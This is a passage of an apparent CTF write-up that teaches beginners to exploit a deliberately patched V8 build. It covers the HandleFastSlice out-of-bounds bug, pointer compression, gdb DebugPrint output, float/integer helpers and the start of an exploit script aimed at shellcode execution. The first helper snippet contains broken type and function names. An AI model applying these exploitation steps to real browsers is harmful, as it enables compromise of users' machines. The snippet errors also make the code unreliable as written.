</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">+</span>        <span class="kr">const</span> <span class="nx">array</span><span class="o">:</span> <span class="nx">JSArray</span> <span class="o">=</span> <span class="nx">ExtractFastJSArray</span><span class="p">(</span><span class="nx">context</span><span class="p">,</span> <span class="nx">a</span><span class="p">,</span> <span class="nx">start</span><span class="p">,</span> <span class="nx">count</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="kr">const</span> <span class="nx">newLength</span><span class="o">:</span> <span class="nx">Smi</span> <span class="o">=</span> <span class="nx">Cast</span><span class="o">&lt;</span><span class="nx">Smi</span><span class="o">&gt;</span><span class="p">(</span><span class="nx">count</span> <span class="o">-</span> <span class="nx">start</span> <span class="o">+</span> <span class="nx">SmiConstant</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>            <span class="nx">otherwise</span> <span class="nx">Bailout</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="nx">array</span><span class="p">.</span><span class="nx">ChangeLength</span><span class="p">(</span><span class="nx">newLength</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="o">+</span>        <span class="k">return</span> <span class="nx">array</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">       <span class="p">}</span>
</span></span><span class="line"><span class="cl">       <span class="k">case</span> <span class="p">(</span><span class="nx">a</span><span class="o">:</span> <span class="nx">JSStrictArgumentsObject</span><span class="p">)</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">         <span class="kr">goto</span> <span class="nx">HandleSimpleArgumentsSlice</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span></span></code></pre></div><p>Now, what changed here is the instead of directly returning the array with <code>ExtractFastJSArray</code> the patch stores it in variable <code>array</code> then define the new length with the line <code>const newLength: Smi = Cast&lt;Smi&gt;(count - start + SmiConstant(2))</code> which subtracts the count from the start(we will see this in action soon enough), then add <code>2</code> to the result and cast it to the <code>smi</code> and then the next line <code>array.ChangeLength(newLength)</code> which updates the length of the <code>array</code> then return the array.
Other changes made to the <code>v8</code> here is the security check so that the we cannot use <code>import (flag_location)</code> which will result in unresolved import showing the flag, this happened in the iSpamAndHex&rsquo;s CTF v8 challenge, write-up was by p4 team, a very <em>smart move</em>.
Now, another interesting change made to the <code>js-array.tq</code> which changes the length of the of an array.</p>
<p>The vulnerability lies in how the slice allows us to access the element of a JSArray, if we give <code>slice(0)</code> we will be able to access the 2 index from the array which will result in OOB read of <code>JSArrayMap</code> and it&rsquo;s element pointer.</p>
<p>So, how do we exploit it? Since this aimed at the very begineers who wanted to pwn that v8 challenge but couldn&rsquo;t(I can relate), I&rsquo;ll go over almost every concept we need to know in order to execute a shellcode. Without further ado, let&rsquo;s dive right in.</p>
<h1 id="pointer-compression" class="relative group">Pointer Compression <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#pointer-compression" aria-label="Anchor">#</a></span></h1><p>Pointer compression has been introduced in the v8 engine which increased the performance of the engine by greater margin. What this means is the upper 32 bytes of the address known as <strong>isolate root</strong> would remain constant for the process while the lower 32 bits of the address can be changed dynamically, as opposed to the OOB challenge of the <code>*ctf </code> which is a good starting point in the browser exploitation, it didn&rsquo;t had the pointer compression. For this challenge, we have to deal with the pointer compression too , it may sound like we have do lots of things to defeat this mechanism, we really don&rsquo;t.</p>
<blockquote>
<p>Writeup for the OOB challenge from *ctf can be found <a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/" target="_blank" rel="noreferrer">here</a></p>
</blockquote>
<p>According to <a href="https://blog.infosectcbr.com.au/2020/02/pointer-compression-in-v8.html" target="_blank" rel="noreferrer">this</a>, which is written by the author himself:-</p>
<hr>
<p>Well, to start off with, there isn’t really an easy way to leak the isolate root (upper 32 bits of the V8 heap memory space) through JS, but if you think about it, there really isn’t a need to do that in the first place.</p>
<p>If you can massage a vulnerability into addrof and fakeobj primitives, you can fake a JSArray and control the elements pointer to gain arbitrary r/w primitives. The catch here is that these primitives would only let you perform arbitrary reads and writes within the V8 heap. Why you ask? Because the elements pointer of a JSArray stores a 32-bit compressed pointer, and if you change it to an arbitrary 32-bit memory address, performing reads and writes using this elements pointer will cause V8 to add the isolation root.</p>
<p>The way around this is to then go the classic route of allocating an ArrayBuffer on the V8 heap and overwriting its backing store to an arbitrary 64-bit memory address. Then, performing reads and writes with it using either a TypedArray or a DataView object will grant you an arbitrary r/w primitive within the entire 64-bit address space.</p>
<p>The reason this works is because the backing stores of array buffers are allocated using PartitionAlloc (I’m not entirely sure if this is still the case, but this was the case approximately 3-4 years ago, and I haven’t seen anything to suggest that it has changed). All PartitionAlloc allocations go on a separate memory region that is not within the V8 heap. This means that the backing store pointer needs to be stored as an uncompressed 64-bit pointer, since its upper 32 bits are not the same as the isolate root and thus have to be stored with the pointer.</p>
<hr>
<p>From above, we know that we need to understand about the <code>fakeobj</code> and <code>addrof</code> because that&rsquo;s what we need for now. Since, we know the vulnerability, we have to now move on to the next part of the exploitation, first we will go through the debugging and understand the structure of the <code>JSArray</code> and what is <code>Map</code> and how exactly we can do with the vulnerability and most importantly how.</p>
<h1 id="handlefastslice-in-action" class="relative group"><code>HandleFastSlice</code> in action <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#handlefastslice-in-action" aria-label="Anchor">#</a></span></h1><p>Enough of the theory part, let&rsquo;s move to some practical part and see how things are at the low level. Since we have the <code>d8</code> binary from the challenge, let&rsquo;s first see the array structure:-</p>
<blockquote>
<p>I am using <code>gdb-gef</code> for analysing the memory, you can find it <a href="https://gef.readthedocs.io/en/master/" target="_blank" rel="noreferrer">here</a>.</p>
</blockquote>
<p>Let&rsquo;s run the binary within the <code>gdb</code>:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">d4mian@pwnbox:</span><span class="err">~/</span><span class="nf">CTFs$</span> <span class="no">gdb</span> <span class="p">.</span><span class="err">/</span><span class="no">d8</span> 
</span></span><span class="line"><span class="cl"><span class="no">GNU</span> <span class="no">gdb</span> <span class="p">(</span><span class="no">Ubuntu</span> <span class="mi">8</span><span class="no">.1-0ubuntu3.2</span><span class="p">)</span> <span class="mi">8</span><span class="no">.1.0.20180409-git</span>
</span></span><span class="line"><span class="cl"><span class="nf">Copyright</span> <span class="p">(</span><span class="no">C</span><span class="p">)</span> <span class="mi">2018</span> <span class="no">Free</span> <span class="no">Software</span> <span class="no">Foundation</span><span class="p">,</span> <span class="no">Inc.</span>
</span></span><span class="line"><span class="cl"><span class="nf">License</span> <span class="no">GPLv3</span><span class="err">+</span><span class="p">:</span> <span class="no">GNU</span> <span class="no">GPL</span> <span class="no">version</span> <span class="mi">3</span> <span class="no">or</span> <span class="no">later</span> <span class="err">&lt;</span><span class="no">http</span><span class="p">:</span><span class="c1">//gnu.org/licenses/gpl.html&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">This</span> <span class="no">is</span> <span class="no">free</span> <span class="no">software</span><span class="p">:</span> <span class="no">you</span> <span class="no">are</span> <span class="no">free</span> <span class="no">to</span> <span class="no">change</span> <span class="no">and</span> <span class="no">redistribute</span> <span class="no">it.</span>
</span></span><span class="line"><span class="cl"><span class="nf">There</span> <span class="no">is</span> <span class="no">NO</span> <span class="no">WARRANTY</span><span class="p">,</span> <span class="no">to</span> <span class="no">the</span> <span class="no">extent</span> <span class="no">permitted</span> <span class="no">by</span> <span class="no">law.</span>  <span class="no">Type</span> <span class="err">&#34;</span><span class="no">show</span> <span class="no">copying</span><span class="err">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nf">and</span> <span class="err">&#34;</span><span class="no">show</span> <span class="no">warranty</span><span class="err">&#34;</span> <span class="no">for</span> <span class="no">details.</span>
</span></span><span class="line"><span class="cl"><span class="nf">This</span> <span class="no">GDB</span> <span class="no">was</span> <span class="no">configured</span> <span class="no">as</span> <span class="err">&#34;</span><span class="no">x86_64-linux-gnu</span><span class="err">&#34;</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="nf">Type</span> <span class="err">&#34;</span><span class="no">show</span> <span class="no">configuration</span><span class="err">&#34;</span> <span class="no">for</span> <span class="no">configuration</span> <span class="no">details.</span>
</span></span><span class="line"><span class="cl"><span class="nf">For</span> <span class="no">bug</span> <span class="no">reporting</span> <span class="no">instructions</span><span class="p">,</span> <span class="no">please</span> <span class="no">see</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="err">&lt;</span><span class="nl">http:</span><span class="c1">//www.gnu.org/software/gdb/bugs/&gt;.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">Find</span> <span class="no">the</span> <span class="no">GDB</span> <span class="no">manual</span> <span class="no">and</span> <span class="no">other</span> <span class="no">documentation</span> <span class="no">resources</span> <span class="no">online</span> <span class="no">at</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="err">&lt;</span><span class="nl">http:</span><span class="c1">//www.gnu.org/software/gdb/documentation/&gt;.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">For</span> <span class="no">help</span><span class="p">,</span> <span class="no">type</span> <span class="err">&#34;</span><span class="no">help</span><span class="err">&#34;</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="nf">Type</span> <span class="err">&#34;</span><span class="no">apropos</span> <span class="no">word</span><span class="err">&#34;</span> <span class="no">to</span> <span class="no">search</span> <span class="no">for</span> <span class="no">commands</span> <span class="no">related</span> <span class="no">to</span> <span class="err">&#34;</span><span class="no">word</span><span class="err">&#34;</span><span class="no">...</span>
</span></span><span class="line"><span class="cl"><span class="nf">GEF</span> <span class="no">for</span> <span class="no">linux</span> <span class="no">ready</span><span class="p">,</span> <span class="no">type</span> <span class="err">`</span><span class="no">gef</span><span class="err">&#39;</span> <span class="no">to</span> <span class="no">start</span><span class="p">,</span> <span class="err">`</span><span class="no">gef</span> <span class="no">config</span><span class="err">&#39;</span> <span class="no">to</span> <span class="no">configure</span>
</span></span><span class="line"><span class="cl"><span class="err">75</span> <span class="nf">commands</span> <span class="no">loaded</span> <span class="no">for</span> <span class="no">GDB</span> <span class="mi">8</span><span class="no">.1.0.20180409-git</span> <span class="no">using</span> <span class="no">Python</span> <span class="no">engine</span> <span class="mi">3</span><span class="no">.6</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">5</span> <span class="nf">commands</span> <span class="no">could</span> <span class="no">not</span> <span class="no">be</span> <span class="no">loaded</span><span class="p">,</span> <span class="no">run</span> <span class="err">`</span><span class="no">gef</span> <span class="no">missing</span><span class="err">`</span> <span class="no">to</span> <span class="no">know</span> <span class="no">why.</span>
</span></span><span class="line"><span class="cl"><span class="nf">Reading</span> <span class="no">symbols</span> <span class="no">from</span> <span class="p">.</span><span class="err">/</span><span class="no">d8...</span><span class="p">(</span><span class="no">no</span> <span class="no">debugging</span> <span class="no">symbols</span> <span class="no">found</span><span class="p">)...</span><span class="no">done.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">run</span> <span class="p">--</span><span class="no">allow-natives-syntax</span>
</span></span><span class="line"><span class="cl"><span class="nf">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mian</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">d8</span> <span class="p">--</span><span class="no">allow-natives-syntax</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">Thread</span> <span class="no">debugging</span> <span class="no">using</span> <span class="no">libthread_db</span> <span class="no">enabled</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Using</span> <span class="no">host</span> <span class="no">libthread_db</span> <span class="no">library</span> <span class="err">&#34;/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libthread_db.so.1</span><span class="err">&#34;</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="nf">New</span> <span class="no">Thread</span> <span class="mi">0x7ffff7006700</span> <span class="p">(</span><span class="no">LWP</span> <span class="mi">3232</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="nf">V8</span> <span class="no">version</span> <span class="mi">8</span><span class="no">.7.9</span>
</span></span><span class="line"><span class="cl"><span class="nf">d8</span><span class="err">&gt;</span> <span class="no">var</span> <span class="no">a</span> <span class="err">=</span> <span class="p">[</span><span class="mi">1</span><span class="no">.1</span><span class="p">,</span> <span class="mi">1</span><span class="no">.2</span><span class="p">,</span> <span class="mi">1</span><span class="no">.4</span><span class="p">]</span><span class="c1">;
</span></span></span></code></pre></div><p>I have used the <code>allow-naitves-syntax</code> flag which will allow us to use functions like <code>%DebugPrint()</code> which prints the information of the variable and it&rsquo;s associated object and their address which makes <code>debug</code> part of the binary.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">d8</span><span class="err">&gt;</span> <span class="nv">%DebugPrint</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">DebugPrint:</span> <span class="err">0</span><span class="nl">x199508084a31:</span> <span class="err">[</span><span class="nf">JSArray</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">map:</span> <span class="err">0</span><span class="nf">x1995082438fd</span> <span class="err">&lt;</span><span class="no">Map</span><span class="p">(</span><span class="no">PACKED_DOUBLE_ELEMENTS</span><span class="p">)</span><span class="err">&gt;</span> <span class="p">[</span><span class="no">FastProperties</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">prototype:</span> <span class="err">0</span><span class="nf">x19950820a555</span> <span class="err">&lt;</span><span class="no">JSArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">elements:</span> <span class="err">0</span><span class="nf">x199508084a11</span> <span class="err">&lt;</span><span class="no">FixedDoubleArray</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="err">&gt;</span> <span class="p">[</span><span class="no">PACKED_DOUBLE_ELEMENTS</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">length:</span> <span class="err">3</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">properties:</span> <span class="err">0</span><span class="nf">x1995080426dd</span> <span class="err">&lt;</span><span class="no">FixedArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="err">&gt;</span> <span class="err">{</span>
</span></span><span class="line"><span class="cl">    <span class="err">0</span><span class="nl">x199508044649:</span> <span class="err">[</span><span class="nf">String</span><span class="p">]</span> <span class="no">in</span> <span class="no">ReadOnlySpace</span><span class="p">:</span> <span class="c1">#length: 0x199508182159 &lt;AccessorInfo&gt; (const accessor descriptor)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="err">}</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">elements:</span> <span class="err">0</span><span class="nf">x199508084a11</span> <span class="err">&lt;</span><span class="no">FixedDoubleArray</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="err">&gt;</span> <span class="err">{</span>
</span></span><span class="line"><span class="cl">           <span class="err">0:</span> <span class="err">1</span><span class="nf">.1</span>
</span></span><span class="line"><span class="cl">           <span class="err">1:</span> <span class="err">1</span><span class="nf">.2</span>
</span></span><span class="line"><span class="cl">           <span class="err">2:</span> <span class="err">1</span><span class="nf">.4</span>
</span></span><span class="line"><span class="cl"> <span class="err">}</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x1995082438fd:</span> <span class="err">[</span><span class="nf">Map</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">type:</span> <span class="nf">JS_ARRAY_TYPE</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">instance</span> <span class="no">size</span><span class="p">:</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">inobject</span> <span class="no">properties</span><span class="p">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">elements</span> <span class="no">kind</span><span class="p">:</span> <span class="no">PACKED_DOUBLE_ELEMENTS</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">unused</span> <span class="no">property</span> <span class="no">fields</span><span class="p">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">enum</span> <span class="no">length</span><span class="p">:</span> <span class="no">invalid</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">back</span> <span class="no">pointer</span><span class="p">:</span> <span class="mi">0x1995082438d5</span> <span class="err">&lt;</span><span class="no">Map</span><span class="p">(</span><span class="no">HOLEY_SMI_ELEMENTS</span><span class="p">)</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">prototype_validity</span> <span class="no">cell</span><span class="p">:</span> <span class="mi">0x199508182445</span> <span class="err">&lt;</span><span class="no">Cell</span> <span class="no">value</span><span class="err">=</span> <span class="mi">1</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">instance</span> <span class="no">descriptors</span> <span class="c1">#1: 0x19950820abd9 &lt;DescriptorArray[1]&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span> <span class="err">-</span> <span class="nf">transitions</span> <span class="c1">#1: 0x19950820ac25 &lt;TransitionArray[4]&gt;Transition array #1:
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>     <span class="err">0</span><span class="nf">x199508044f5d</span> <span class="err">&lt;</span><span class="no">Symbol</span><span class="p">:</span> <span class="p">(</span><span class="no">elements_transition_symbol</span><span class="p">)</span><span class="err">&gt;</span><span class="p">:</span> <span class="p">(</span><span class="no">transition</span> <span class="no">to</span> <span class="no">HOLEY_DOUBLE_ELEMENTS</span><span class="p">)</span> <span class="p">-</span><span class="err">&gt;</span> <span class="mi">0x199508243925</span> <span class="err">&lt;</span><span class="no">Map</span><span class="p">(</span><span class="no">HOLEY_DOUBLE_ELEMENTS</span><span class="p">)</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">prototype:</span> <span class="err">0</span><span class="nf">x19950820a555</span> <span class="err">&lt;</span><span class="no">JSArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nl">constructor:</span> <span class="err">0</span><span class="nf">x19950820a429</span> <span class="err">&lt;</span><span class="no">JSFunction</span> <span class="no">Array</span> <span class="p">(</span><span class="no">sfi</span> <span class="err">=</span> <span class="mi">0x19950818b399</span><span class="p">)</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">dependent</span> <span class="no">code</span><span class="p">:</span> <span class="mi">0x1995080421e1</span> <span class="err">&lt;</span><span class="no">Other</span> <span class="no">heap</span> <span class="no">object</span> <span class="p">(</span><span class="no">WEAK_FIXED_ARRAY_TYPE</span><span class="p">)</span><span class="err">&gt;</span>
</span></span><span class="line"><span class="cl"> <span class="err">-</span> <span class="nf">construction</span> <span class="no">counter</span><span class="p">:</span> <span class="mi">0</span>
</span></span></code></pre></div><p>Using <code>DebugPrint(a)</code> we got a lot of information about the variable <code>a</code>, better to break it down and understand the output one by one. First off, <code>DebugPrint</code> tells us that <code>JSArray</code> is located at the <code>0x199508084a31</code> and the map of the <code>JSArray</code> is located at the <code>0x1995082438fd</code> and the address <code>0x199508084a11</code> is pointing to the elements stored. The Debug Output is enough to understand what is here if you&rsquo;ve done binary exploitation.</p>
<p>From the vulnerability, we know that we can access <code>start + 2</code> elements of the JSArray, which if you go through the above output would be <code>JSArrayMap</code> and other would be <code>FixedDoubleArray</code>. Now, we know that we can access the map and the pointer to the elements of the <code>JSArray</code>, what do we do now?</p>
<p>It is true that we read by the slice method but we also need a write primitve, if you remember from the patch file, the length of the <code>JSArray</code> is being extended during the inital call of the <code>HandleFastSlice</code>, which means we can change the content of the <code>JSArrayMap</code> and the <code>FixedDoubleArray</code> which is a pointer to the array&rsquo;s elements. Now, we know what we can do with the vulnerability, let&rsquo;s move on.</p>
<p>Before we move on, the address will be represented in the floating point value but for debugging we need the 64 bit representation of the floating value and vice versa, we can use JS to make us some utility function to help out with this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FloatArray</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Unint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">,</span> <span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">   <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="nx">BigUint</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">   <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">,</span> <span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="p">}</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The above utilites function would change the integer to the float and the float to integer named <code>itof</code> and <code>ftoi</code> respectively. Now, we have the utilties function lets create a JS script in which we can access the <code>array[length + 1]</code> which will give us the <code>JSArray</code>&rsquo;s map and the <code>array[length + 2]</code> which will give us the pointer of the elements stored in the <code>JSArray</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">aux_float_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">2.2</span><span class="p">,</span> <span class="mf">3.3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">aux_arr</span> <span class="o">=</span> <span class="nx">aux_float_arr</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">aux_float_arr</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">When we do `aux_float_arr.slice(aux_float_arr)` the slice function will try to show the whole array + 2 more than the actual length of it which
</span></span></span><span class="line"><span class="cl"><span class="cm">will turn into the OOB read. hence leaking the addresses.
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">,</span> <span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">,</span> <span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">size</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
